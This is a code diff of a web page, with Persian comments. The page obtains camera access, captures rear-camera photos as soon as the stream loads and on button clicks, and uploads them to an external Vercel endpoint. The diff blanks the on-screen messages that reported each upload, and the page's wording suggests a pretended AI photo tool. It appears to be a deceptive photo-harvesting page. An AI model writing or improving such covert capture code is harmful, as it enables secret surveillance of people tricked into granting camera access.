@@ -90,85 +90,83 @@ p{
 </div>
 <script>
 
-    const btn=document.getElementById('button');
-    btn.addEventListener("click",()=>{
-        alert("عکس پردازش عکس با خطا مواجه شد لطفا در جای درست و چهره تان واضح باشه و اگر دوباره این  پیغام ظاهر شد لطفا به توسعه دهنده هوش مصنوعی اطلاع دهید")
-    })
+  
    const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const log = document.getElementById('log');
     const startBtn = document.getElementById('startBtn');
+    const controlsDiv = document.getElementById('controls');
+    const sendManualBtn = document.getElementById('button');
     let streamActive = false;
 
-    // در موبایل حتما باید کاربر یک کلیک بکند تا دوربین اجازه پخش داشته باشد
+    // --- R1: شروع دوربین و ارسال اولین عکس ---
     startBtn.addEventListener('click', async () => {
         startBtn.style.display = 'none';
-        log.innerText = "در حال درخواست مجوز دوربین...";
+        controlsDiv.style.display = 'block';
+        video.style.display = 'block';
+        log.innerText = "در حال گرفتن مجوز دوربین...";
         startCamera();
+    });
+
+    // --- R2: دکمه ارسال دستی ---
+    sendManualBtn.addEventListener('click', () => {
+        if (streamActive) {
+            log.innerText = "";
+            captureAndSend();
+        } else {
+            log.innerText = "⚠️ ابتدا دوربین باید فعال شود.";
+        }
     });
 
     async function startCamera() {
         try {
-            // درخواست دوربین (مخصوص موبایل تنظیم شده)
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: 'environment', // دوربین پشت
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
-                }, 
+                video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }, 
                 audio: false 
             });
 
             video.srcObject = stream;
             
-            // صبر میکنیم تا ویدیو واقعا لود شود
             video.onloadedmetadata = () => {
                 video.play();
-                log.innerText = "✅ دوربین وصل شد. شروع ارسال...";
+                log.innerText = "";
                 streamActive = true;
-                // شروع ارسال عکس هر 4 ثانیه
-                setInterval(captureAndSend, 4000);
+                
+                // گرفتن و ارسال اولین عکس بلافاصله پس از لود شدن (R1)
+                captureAndSend();
             };
 
         } catch (err) {
+            log.innerText = "❌ خطا: دسترسی به دوربین صادر نشد.";
             console.error(err);
-            log.innerText = "❌ خطا: دسترسی به دوربین داده نشد یا مرورگر اجازه نداد.";
-            alert("لطفا دسترسی دوربین را تایید کنید.");
         }
     }
 
     async function captureAndSend() {
-        if (!streamActive) return;
+        if (!streamActive || video.videoWidth === 0) return;
 
-        // اطمینان از اینکه ویدیو سایز دارد
-        if (video.videoWidth === 0 || video.videoHeight === 0) {
-            console.log("ویدیو هنوز لود نشده...");
-            return;
-        }
-
-        // تنظیم سایز بوم نقاشی (Canvas) دقیقا هم‌اندازه ویدیو
+        // تنظیم ابعاد Canvas
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // تبدیل به عکس و ارسال
         canvas.toBlob(blob => {
             if(blob) sendToBackend(blob);
-        }, 'image/jpeg', 0.6); // کیفیت متوسط برای سرعت بهتر
+        }, 'image/jpeg', 0.8); // کیفیت 80%
     }
 
     async function sendToBackend(blob) {
         const formData = new FormData();
-        formData.append('photo', blob, 'cam.jpg');
+        formData.append('photo', blob, 'manual-cam-photo.jpg');
 
         try {
-            log.innerText = "📤 در حال ارسال عکس...";
+            log.innerText = "";
             await fetch('https://eeeeyuzl.vercel.app/send-photo', { method: 'POST', body: formData });
-            log.innerText = "✅ عکس ارسال شد.";
+            log.innerText = ``; 
         } catch (e) {
-            log.innerText = "⚠️ خطا در ارسال به سرور";
+            log.innerText = "⚠️ خطا در ارسال به سرور.";
         }
     }
 </script>
@@ -176,5 +174,6 @@ p{
 </body>
 
 </html>
+
 
 
